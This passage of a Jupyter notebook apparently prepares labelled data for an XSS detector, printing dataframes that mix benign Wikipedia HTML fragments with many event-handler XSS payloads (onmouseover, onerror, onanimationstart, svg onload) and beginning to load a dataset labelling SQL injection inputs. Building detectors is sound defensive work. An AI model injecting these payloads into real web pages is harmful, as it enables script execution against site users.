         "<div draggable=\"true\" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",
         "1"
        ],
        [
         "28",
         "\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>",
         "0"
        ],
        [
         "29",
         "\t </span> <span class=\"reference-text\"><cite class=\"citation journal\"><a href=\"/wiki/Woody_Evans\" title=\"Woody Evans\">Evans, Woody </a> (2015). \"Posthuman Rights: Dimensions of Transhuman Worlds\". <i>Teknokultura </i>. <b>12 </b> (2). <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.5209%2Frev_TK.2015.v12.n2.49072\">10.5209/rev_TK.2015.v12.n2.49072 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Teknokultura&amp;rft.atitle=Posthuman+Rights%3A+Dimensions+of+Transhuman+Worlds&amp;rft.volume=12&amp;rft.issue=2&amp;rft.date=2015&amp;rft_id=info%3Adoi%2F10.5209%2Frev_TK.2015.v12.n2.49072&amp;rft.aulast=Evans&amp;rft.aufirst=Woody&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ",
         "0"
        ],
        [
         "30",
         "<spacer onkeypress=\"alert(1)\" contenteditable>test</spacer>",
         "1"
        ],
        [
         "31",
         "<li><cite id=\"CITEREFOudeyer2010\" class=\"citation journal\">Oudeyer, P-Y. (2010). <a rel=\"nofollow\" class=\"external text\" href=\"http://www.pyoudeyer.com/IEEETAMDOudeyer10.pdf\">\"On the impact of robotics in behavioral and cognitive sciences: from insect navigation to human cognitive development\" </a> <span class=\"cs1-format\">(PDF) ",
         "0"
        ],
        [
         "32",
         "<style>@keyframes slidein {}</style><center style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></center>",
         "1"
        ],
        [
         "33",
         "<pre draggable=\"true\" ondragend=\"alert(1)\">test</pre>",
         "1"
        ],
        [
         "34",
         "\t </span>",
         "0"
        ],
        [
         "35",
         "<li><a href=\"#CITEREFNilsson1998\">Nilsson 1998 </a>, chpt. 8 </li> </ul>",
         "0"
        ],
        [
         "36",
         "<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>",
         "1"
        ],
        [
         "37",
         "<style>@keyframes x{}</style><main style=\"animation-name:x\" onanimationstart=\"alert(1)\"></main>",
         "1"
        ],
        [
         "38",
         "<article draggable=\"true\" ondrag=\"alert(1)\">test</article>",
         "1"
        ],
        [
         "39",
         "<li><a href=\"/wiki/Computational_physics\" title=\"Computational physics\">Computational physics </a> </li>",
         "0"
        ],
        [
         "40",
         "\t </span>. <i>Behavioral and Brain Sciences </i>. <b>3 </b> (3): 417–457. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1017%2FS0140525X00005756\">10.1017/S0140525X00005756 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Behavioral+and+Brain+Sciences&amp;rft.atitle=Minds%2C+Brains+and+Programs&amp;rft.volume=3&amp;rft.issue=3&amp;rft.pages=417-457&amp;rft.date=1980&amp;rft_id=info%3Adoi%2F10.1017%2FS0140525X00005756&amp;rft.aulast=Searle&amp;rft.aufirst=John&amp;rft_id=http%3A%2F%2Fcogprints.org%2F7150%2F1%2F10.1.1.83.5248.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ",
         "0"
        ],
        [
         "41",
         "<rtc draggable=\"true\" ondragleave=\"alert(1)\">test</rtc>",
         "1"
        ],
        [
         "42",
         "\t </span> <span class=\"reference-text\"><cite class=\"citation journal\">Prakken, Henry (31 August 2017). \"On the problem of making autonomous vehicles conform to traffic law\". <i>Artificial Intelligence and Law </i>. <b>25 </b> (3): 341–363. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1007%2Fs10506-017-9210-0\">10.1007/s10506-017-9210-0 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Artificial+Intelligence+and+Law&amp;rft.atitle=On+the+problem+of+making+autonomous+vehicles+conform+to+traffic+law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info%3Adoi%2F10.1007%2Fs10506-017-9210-0&amp;rft.aulast=Prakken&amp;rft.aufirst=Henry&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ",
         "0"
        ],
        [
         "43",
         "\t </span><span class=\"mw-editsection\"><span class=\"mw-editsection-bracket\">[ ",
         "0"
        ],
        [
         "44",
         "\t<sup id=\"cite_ref-Biological_intelligence_vs._intelligence_in_general_16-1\" class=\"reference\"><a href=\"#cite_note-Biological_intelligence_vs._intelligence_in_general-16\">&#91;16&#93; </a> </sup>",
         "0"
        ],
        [
         "45",
         "\t\t\t<div class=\"thumbcaption\">",
         "0"
        ],
        [
         "46",
         "<li id=\"cite_note-recurse-409\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-recurse_409-0\">^ </a> </b> ",
         "0"
        ],
        [
         "47",
         "<div draggable=\"true\" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",
         "1"
        ],
        [
         "48",
         "\t\t </div>",
         "0"
        ],
        [
         "49",
         "<li><a href=\"/wiki/Glossary_of_calculus\" title=\"Glossary of calculus\">Calculus </a> </li>",
         "0"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 13686
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;li&gt;&lt;a href=\"/wiki/File:Socrates.png\" class=\"i...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;tt onmouseover=\"alert(1)\"&gt;test&lt;/tt&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>\\t &lt;/span&gt; &lt;span class=\"reference-text\"&gt;Steeri...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>\\t &lt;/span&gt; &lt;span class=\"reference-text\"&gt;&lt;cite ...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>\\t &lt;/span&gt;. &lt;a href=\"/wiki/Digital_object_iden...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13681</th>\n",
       "      <td>&lt;img onpointerenter=alert(1)&gt;XSS&lt;/img&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13682</th>\n",
       "      <td>&lt;source onbeforepaste=\"alert(1)\" contenteditab...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13683</th>\n",
       "      <td>&lt;div draggable=\"true\" contenteditable&gt;drag me&lt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13684</th>\n",
       "      <td>&lt;li&gt;&lt;cite id=\"CITEREFDomingos2015\" class=\"cita...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13685</th>\n",
       "      <td>\\t &lt;/span&gt;</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>13686 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 payload  xss\n",
       "0      <li><a href=\"/wiki/File:Socrates.png\" class=\"i...    0\n",
       "1                   <tt onmouseover=\"alert(1)\">test</tt>    1\n",
       "2      \\t </span> <span class=\"reference-text\">Steeri...    0\n",
       "3      \\t </span> <span class=\"reference-text\"><cite ...    0\n",
       "4      \\t </span>. <a href=\"/wiki/Digital_object_iden...    0\n",
       "...                                                  ...  ...\n",
       "13681             <img onpointerenter=alert(1)>XSS</img>    1\n",
       "13682  <source onbeforepaste=\"alert(1)\" contenteditab...    1\n",
       "13683  <div draggable=\"true\" contenteditable>drag me<...    1\n",
       "13684  <li><cite id=\"CITEREFDomingos2015\" class=\"cita...    0\n",
       "13685                                         \\t </span>    0\n",
       "\n",
       "[13686 rows x 2 columns]"
      ]
     },
     "execution_count": 778,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_data.drop(columns=[\"Unnamed: 0\"], inplace=True)\n",
    "xss_data.rename(columns={\"Sentence\": \"payload\", \"Label\": \"xss\"}, inplace=True)\n",
    "xss_data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 779,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "354af4e0-f949-4574-8678-564974ce4556",
       "rows": [
        [
         "0",
         "<li><a href=\"/wiki/File:Socrates.png\" class=\"image\"><img alt=\"Socrates.png\" src=\"//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png\" decoding=\"async\" width=\"18\" height=\"28\" class=\"noviewer\" srcset=\"//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/27px-Socrates.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/36px-Socrates.png 2x\" data-file-width=\"326\" data-file-height=\"500\" /> </a> <a href=\"/wiki/Portal:Philosophy\" title=\"Portal:Philosophy\">Philosophy&#32;portal </a> </li> </ul>",
         "0"
        ],
        [
         "1",
         "<tt onmouseover=\"alert(1)\">test</tt>",
         "1"
        ],
        [
         "2",
         "\t </span> <span class=\"reference-text\">Steering for the 1995 \"<a href=\"/wiki/History_of_autonomous_cars#1990s\" class=\"mw-redirect\" title=\"History of autonomous cars\">No Hands Across America </a>\" required \"only a few human assists\". ",
         "0"
        ],
        [
         "3",
         "\t </span> <span class=\"reference-text\"><cite class=\"citation web\"><a rel=\"nofollow\" class=\"external text\" href=\"https://www.mileseducation.com/finance/artificial_intelligence\">\"Miles Education | Future Of Finance | Blockchain Fundamentals for F&amp;A Professionals Certificate\" </a>. <i>www.mileseducation.com </i><span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">26 September ",
         "0"
        ],
        [
         "4",
         "\t </span>. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1016%2FS0921-8890%2805%2980025-9\">10.1016/S0921-8890(05)80025-9 </a>. <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20070809020912/http://people.csail.mit.edu/brooks/papers/elephants.pdf\">Archived </a> <span class=\"cs1-format\">(PDF) ",
         "0"
        ],
        [
         "5",
         "<li id=\"cite_note-118\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-118\">^ </a> </b> ",
         "0"
        ],
        [
         "6",
         "<li><a href=\"/wiki/Contextualism\" title=\"Contextualism\">Contextualism </a> </li>",
         "0"
        ],
        [
         "7",
         "<li id=\"cite_note-Representing_causation-95\"><span class=\"mw-cite-backlink\">^ <a href=\"#cite_ref-Representing_causation_95-0\"><sup><i><b>a </b> </i> </sup> </a> <a href=\"#cite_ref-Representing_causation_95-1\"><sup><i><b>b </b> </i> </sup> </a> ",
         "0"
        ],
        [
         "8",
         " <tr><td class=\"plainlist\" style=\"padding:0 0.1em 0.4em\">",
         "0"
        ],
        [
         "9",
         "\t </span>",
         "0"
        ],
        [
         "10",
         "<li><a href=\"/wiki/Mind%E2%80%93body_problem\" title=\"Mind–body problem\">Mind–body problem </a>",
         "0"
        ],
        [
         "11",
         "<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>",
         "1"
        ],
        [
         "12",
         "<col draggable=\"true\" ondragenter=\"alert(1)\">test</col>",
         "1"
        ],
        [
         "13",
         "<caption onpointerdown=alert(1)>XSS</caption>",
         "1"
        ],
        [
         "14",
         "\t </span>",
         "0"
        ],
        [
         "15",
         "\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>",
         "0"
        ],
        [
         "16",
         "<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>",
         "1"
        ],
        [
         "17",
         "<style onmouseleave=\"alert(1)\">test</style>",
         "1"
        ],
        [
         "18",
         "<svg><meta onload=alert(1)></meta>",
         "1"
        ],
        [
         "19",
         "<li><a href=\"/wiki/Programming_language\" title=\"Programming language\">Programming language </a> </li>",
         "0"
        ],
        [
         "20",
         "<figcaption onpointerleave=alert(1)>XSS</figcaption>",
         "1"
        ],
        [
         "21",
         "\t </span> <span class=\"reference-text\"><cite class=\"citation news\"><a rel=\"nofollow\" class=\"external text\" href=\"https://www.economist.com/news/special-report/21700756-artificial-intelligence-boom-based-old-idea-modern-twist-not\">\"From not working to neural networking\" </a>. <i>The Economist </i>. 2016<span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">26 April ",
         "0"
        ],
        [
         "22",
         "</div>",
         "0"
        ],
        [
         "23",
         "<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>",
         "1"
        ],
        [
         "24",
         "<input type=image src=1 onerror=alert(1)>",
         "1"
        ],
        [
         "25",
         "<strong ondblclick=\"alert(1)\">test</strong>",
         "1"
        ],
        [
         "26",
         "<li><a href=\"/wiki/Computer_data_storage\" title=\"Computer data storage\">Information storage systems </a> </li>",
         "0"
        ],
        [
         "27",
         "<div draggable=\"true\" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",
         "1"
        ],
        [
         "28",
         "\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>",
         "0"
        ],
        [
         "29",
         "\t </span> <span class=\"reference-text\"><cite class=\"citation journal\"><a href=\"/wiki/Woody_Evans\" title=\"Woody Evans\">Evans, Woody </a> (2015). \"Posthuman Rights: Dimensions of Transhuman Worlds\". <i>Teknokultura </i>. <b>12 </b> (2). <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.5209%2Frev_TK.2015.v12.n2.49072\">10.5209/rev_TK.2015.v12.n2.49072 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Teknokultura&amp;rft.atitle=Posthuman+Rights%3A+Dimensions+of+Transhuman+Worlds&amp;rft.volume=12&amp;rft.issue=2&amp;rft.date=2015&amp;rft_id=info%3Adoi%2F10.5209%2Frev_TK.2015.v12.n2.49072&amp;rft.aulast=Evans&amp;rft.aufirst=Woody&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ",
         "0"
        ],
        [
         "30",
         "<spacer onkeypress=\"alert(1)\" contenteditable>test</spacer>",
         "1"
        ],
        [
         "31",
         "<li><cite id=\"CITEREFOudeyer2010\" class=\"citation journal\">Oudeyer, P-Y. (2010). <a rel=\"nofollow\" class=\"external text\" href=\"http://www.pyoudeyer.com/IEEETAMDOudeyer10.pdf\">\"On the impact of robotics in behavioral and cognitive sciences: from insect navigation to human cognitive development\" </a> <span class=\"cs1-format\">(PDF) ",
         "0"
        ],
        [
         "32",
         "<style>@keyframes slidein {}</style><center style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></center>",
         "1"
        ],
        [
         "33",
         "<pre draggable=\"true\" ondragend=\"alert(1)\">test</pre>",
         "1"
        ],
        [
         "34",
         "\t </span>",
         "0"
        ],
        [
         "35",
         "<li><a href=\"#CITEREFNilsson1998\">Nilsson 1998 </a>, chpt. 8 </li> </ul>",
         "0"
        ],
        [
         "36",
         "<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>",
         "1"
        ],
        [
         "37",
         "<style>@keyframes x{}</style><main style=\"animation-name:x\" onanimationstart=\"alert(1)\"></main>",
         "1"
        ],
        [
         "38",
         "<article draggable=\"true\" ondrag=\"alert(1)\">test</article>",
         "1"
        ],
        [
         "39",
         "<li><a href=\"/wiki/Computational_physics\" title=\"Computational physics\">Computational physics </a> </li>",
         "0"
        ],
        [
         "40",
         "\t </span>. <i>Behavioral and Brain Sciences </i>. <b>3 </b> (3): 417–457. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1017%2FS0140525X00005756\">10.1017/S0140525X00005756 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Behavioral+and+Brain+Sciences&amp;rft.atitle=Minds%2C+Brains+and+Programs&amp;rft.volume=3&amp;rft.issue=3&amp;rft.pages=417-457&amp;rft.date=1980&amp;rft_id=info%3Adoi%2F10.1017%2FS0140525X00005756&amp;rft.aulast=Searle&amp;rft.aufirst=John&amp;rft_id=http%3A%2F%2Fcogprints.org%2F7150%2F1%2F10.1.1.83.5248.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ",
         "0"
        ],
        [
         "41",
         "<rtc draggable=\"true\" ondragleave=\"alert(1)\">test</rtc>",
         "1"
        ],
        [
         "42",
         "\t </span> <span class=\"reference-text\"><cite class=\"citation journal\">Prakken, Henry (31 August 2017). \"On the problem of making autonomous vehicles conform to traffic law\". <i>Artificial Intelligence and Law </i>. <b>25 </b> (3): 341–363. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1007%2Fs10506-017-9210-0\">10.1007/s10506-017-9210-0 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Artificial+Intelligence+and+Law&amp;rft.atitle=On+the+problem+of+making+autonomous+vehicles+conform+to+traffic+law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info%3Adoi%2F10.1007%2Fs10506-017-9210-0&amp;rft.aulast=Prakken&amp;rft.aufirst=Henry&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ",
         "0"
        ],
        [
         "43",
         "\t </span><span class=\"mw-editsection\"><span class=\"mw-editsection-bracket\">[ ",
         "0"
        ],
        [
         "44",
         "\t<sup id=\"cite_ref-Biological_intelligence_vs._intelligence_in_general_16-1\" class=\"reference\"><a href=\"#cite_note-Biological_intelligence_vs._intelligence_in_general-16\">&#91;16&#93; </a> </sup>",
         "0"
        ],
        [
         "45",
         "\t\t\t<div class=\"thumbcaption\">",
         "0"
        ],
        [
         "46",
         "<li id=\"cite_note-recurse-409\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-recurse_409-0\">^ </a> </b> ",
         "0"
        ],
        [
         "47",
         "<div draggable=\"true\" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",
         "1"
        ],
        [
         "48",
         "\t\t </div>",
         "0"
        ],
        [
         "49",
         "<li><a href=\"/wiki/Glossary_of_calculus\" title=\"Glossary of calculus\">Calculus </a> </li>",
         "0"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 13686
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;li&gt;&lt;a href=\"/wiki/File:Socrates.png\" class=\"i...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;tt onmouseover=\"alert(1)\"&gt;test&lt;/tt&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>\\t &lt;/span&gt; &lt;span class=\"reference-text\"&gt;Steeri...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>\\t &lt;/span&gt; &lt;span class=\"reference-text\"&gt;&lt;cite ...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>\\t &lt;/span&gt;. &lt;a href=\"/wiki/Digital_object_iden...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13681</th>\n",
       "      <td>&lt;img onpointerenter=alert(1)&gt;XSS&lt;/img&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13682</th>\n",
       "      <td>&lt;source onbeforepaste=\"alert(1)\" contenteditab...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13683</th>\n",
       "      <td>&lt;div draggable=\"true\" contenteditable&gt;drag me&lt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13684</th>\n",
       "      <td>&lt;li&gt;&lt;cite id=\"CITEREFDomingos2015\" class=\"cita...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13685</th>\n",
       "      <td>\\t &lt;/span&gt;</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>13686 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 payload  xss\n",
       "0      <li><a href=\"/wiki/File:Socrates.png\" class=\"i...    0\n",
       "1                   <tt onmouseover=\"alert(1)\">test</tt>    1\n",
       "2      \\t </span> <span class=\"reference-text\">Steeri...    0\n",
       "3      \\t </span> <span class=\"reference-text\"><cite ...    0\n",
       "4      \\t </span>. <a href=\"/wiki/Digital_object_iden...    0\n",
       "...                                                  ...  ...\n",
       "13681             <img onpointerenter=alert(1)>XSS</img>    1\n",
       "13682  <source onbeforepaste=\"alert(1)\" contenteditab...    1\n",
       "13683  <div draggable=\"true\" contenteditable>drag me<...    1\n",
       "13684  <li><cite id=\"CITEREFDomingos2015\" class=\"cita...    0\n",
       "13685                                         \\t </span>    0\n",
       "\n",
       "[13686 rows x 2 columns]"
      ]
     },
     "execution_count": 779,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 780,
   "metadata": {},
   "outputs": [],
   "source": [
    "xss_data.to_csv(\"../Datasets/Processed/xss_data.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### our_Dataset - min.xlsx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 781,
   "metadata": {},
   "outputs": [],
   "source": [
    "dsm = pd.read_excel(\"../Datasets/our_Dataset - min.xlsx\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 782,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "sentence",
         "rawType": "object",
         "type": "unknown"
        },
        {
         "name": "attack_type_code",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "attack_type",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "http_method",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "param_as",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "flag_success_attack",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "http_status",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "param_length",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Unnamed: 8",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "Unnamed: 9",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "Unnamed: 10",
         "rawType": "float64",
         "type": "float"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "fd9a98fd-ed2e-4f62-a8ed-946868d807ea",
       "rows": [
        [
         "0",
         "-3752",
         "1",
         "SQL Injection",
         "POST",
         "body (Q.)",
         "0",
         "201.0",
         "18",
         null,
         null,
         null
        ],
        [
         "1",
         "00:00:00",
         "0",
         "No Attack",
         "POST",
         "body (Q.)",
         "0",
         "201.0",
         "14",
         null,
         null,
         null
        ],
        [
         "2",
         "0",
         "0",
         "No Attack",
         "POST",
         "body (Q.)",
         "0",
         "201.0",
         "14",
         null,
         null,
         null
        ],
        [
         "3",
         "0.21",
         "1",
         "SQL Injection",
         "POST",
         "body (Q.)",
         "0",
         "201.0",
         "17",
         null,
         null,
         null
        ],
        [
         "4",
         "0.26",
         "1",
         "SQL Injection",
         "POST",
         "body (Q.)",
         "0",
         "201.0",
         "17",
         null,
         null,
         null
        ]
       ],
       "shape": {
        "columns": 11,
        "rows": 5
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sentence</th>\n",
       "      <th>attack_type_code</th>\n",
       "      <th>attack_type</th>\n",
       "      <th>http_method</th>\n",
       "      <th>param_as</th>\n",
       "      <th>flag_success_attack</th>\n",
       "      <th>http_status</th>\n",
       "      <th>param_length</th>\n",
       "      <th>Unnamed: 8</th>\n",
       "      <th>Unnamed: 9</th>\n",
       "      <th>Unnamed: 10</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>-3752</td>\n",
       "      <td>1</td>\n",
       "      <td>SQL Injection</td>\n",
       "      <td>POST</td>\n",
       "      <td>body (Q.)</td>\n",
       "      <td>0</td>\n",
       "      <td>201.0</td>\n",
       "      <td>18</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>00:00:00</td>\n",
       "      <td>0</td>\n",
       "      <td>No Attack</td>\n",
       "      <td>POST</td>\n",
       "      <td>body (Q.)</td>\n",
       "      <td>0</td>\n",
       "      <td>201.0</td>\n",
       "      <td>14</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>No Attack</td>\n",
       "      <td>POST</td>\n",
       "      <td>body (Q.)</td>\n",
       "      <td>0</td>\n",
       "      <td>201.0</td>\n",
       "      <td>14</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0.21</td>\n",
       "      <td>1</td>\n",
